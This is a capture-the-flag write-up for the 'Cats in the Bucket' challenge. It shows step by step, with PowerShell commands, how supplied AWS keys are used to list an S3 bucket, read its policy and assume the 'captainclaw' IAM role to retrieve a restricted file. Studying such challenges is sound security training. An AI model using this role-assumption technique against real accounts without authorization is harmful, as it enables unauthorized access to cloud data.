# [HE2023] Cats in the Bucket

- We are given a _Bucket name_, an _Access Key ID_ and a _Secret Access Key_. This obviously sounds like it could be an bucket from AWS S3.

- If we try to access https://cats-in-a-bucket.s3.eu-central-1.amazonaws.com/, we notice that the bucket exist: we get `AccessDenied` (or `PermanentRedirect` if we're using the wrong region) instead of `NoSuchBucket`.

- After reading some documentation, we install [AWS Tools for PowerShell](https://docs.aws.amazon.com/powershell/latest/userguide/pstools-welcome.html), which seems to be what we need to use our access key.

```powershell
Install-Module -Name AWS.Tools.Installer
Install-AWSToolsModule AWS.Tools.S3 -CleanUp
Install-AWSToolsModule AWS.Tools.IdentityManagement -CleanUp
```

`S3` is obviously required to access an `S3` bucket, and `IdentityManagement` will be useful later.

- We create a new local profile and identify using the specified access key.

```powershell
Set-AWSCredential -AccessKey ... -SecretKey ... -StoreAs he2023
Set-AWSCredential -ProfileName MyProfileName he2023
```

- Now we can easily list the bucket content.

```powershell
> Get-S3Object -BucketName cats-in-a-bucket

ChecksumAlgorithm : {}
ETag              : "2996748ce9acdf3cf37a2bcdcd29f274"
BucketName        : cats-in-a-bucket
Key               : cat1.jpg
LastModified      : 2022-10-09 17:23:46
Owner             :
Size              : 83709
StorageClass      : STANDARD

ChecksumAlgorithm : {}
ETag              : "1db7af4b927edbbb89d6a2831b3d7479"
BucketName        : cats-in-a-bucket
Key               : cat2.jpg
LastModified      : 2022-10-09 17:23:48
Owner             :
Size              : 92350
StorageClass      : STANDARD

ChecksumAlgorithm : {}
ETag              : "3f54210b88fd2dd612a82eef1325d536"
BucketName        : cats-in-a-bucket
Key               : cat3.jpg
LastModified      : 2022-10-09 17:23:47
Owner             :
Size              : 119214
StorageClass      : STANDARD

ChecksumAlgorithm : {}
ETag              : "16b240a7554c249bb55ae22e6d8079e9"
BucketName        : cats-in-a-bucket
Key               : cat4.jpg
LastModified      : 2022-10-09 17:23:47
Owner             :
Size              : 87112
StorageClass      : STANDARD
```

- Four images, let's download them all.

```powershell
Read-S3Object -BucketName cats-in-a-bucket -Key cat1.jpg -File cat1.jpg
Read-S3Object -BucketName cats-in-a-bucket -Key cat2.jpg -File cat2.jpg
Read-S3Object -BucketName cats-in-a-bucket -Key cat3.jpg -File cat3.jpg
Read-S3Object -BucketName cats-in-a-bucket -Key cat4.jpg -File cat4.jpg
```

- We can download the first 3 images, but they don't contain any flag, just cat pictures. And we can't download `cat4.jpg`, because we get an access denied. Weird, let's check the permissions.

```powershell
> Get-S3BucketPolicy  -BucketName cats-in-a-bucket
```
```json
{
    "Version": "2008-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::261640479576:user/misterbuttons"
        },
        "Action": ["s3:ListBucket", "s3:GetBucketPolicy"],
        "Resource": "arn:aws:s3:::cats-in-a-bucket"
    }, {
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::261640479576:user/misterbuttons"
        },
        "Action": "s3:GetObject",
        "Resource": ["arn:aws:s3:::cats-in-a-bucket/cat1.jpg", "arn:aws:s3:::cats-in-a-bucket/cat2.jpg", "arn:aws:s3:::cats-in-a-bucket/cat3.jpg"]
    }, {
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::261640479576:role/captainclaw"
        },
        "Action": "s3:ListBucket",
        "Resource": "arn:aws:s3:::cats-in-a-bucket"
    }, {
        "Effect": "Allow",
        "Principal": {
            "AWS": "arn:aws:iam::261640479576:role/captainclaw"
        },
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::cats-in-a-bucket/cat4.jpg"
    }]
}
```

- Interesting, our current user is probably `user/misterbuttons`, and `role/captainclaw` is the only one allowed to access `cat4.jpg`. However, this is a role and not a user. Maybe we can give ourself that role somehow?

- After reading [more documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-twp.html), we try to switch to that role.

```powershell
Set-DefaultAWSRegion -Region eu-central-1
$Creds = (Use-STSRole -RoleArn "arn:aws:iam::261640479576:role/captainclaw" -RoleSessionName "captainclaw").Credentials
```

For some reason, `Use-STSRole` refuses to work if we don't specify the default region, so we set one.

- We can now download `cat4.jpg` using our new credentials.

```powershell
Read-S3Object -BucketName cats-in-a-bucket -Key cat4.jpg -File cat4.jpg -Credential $Creds
```

- `cat4.jpg` contains the flag.
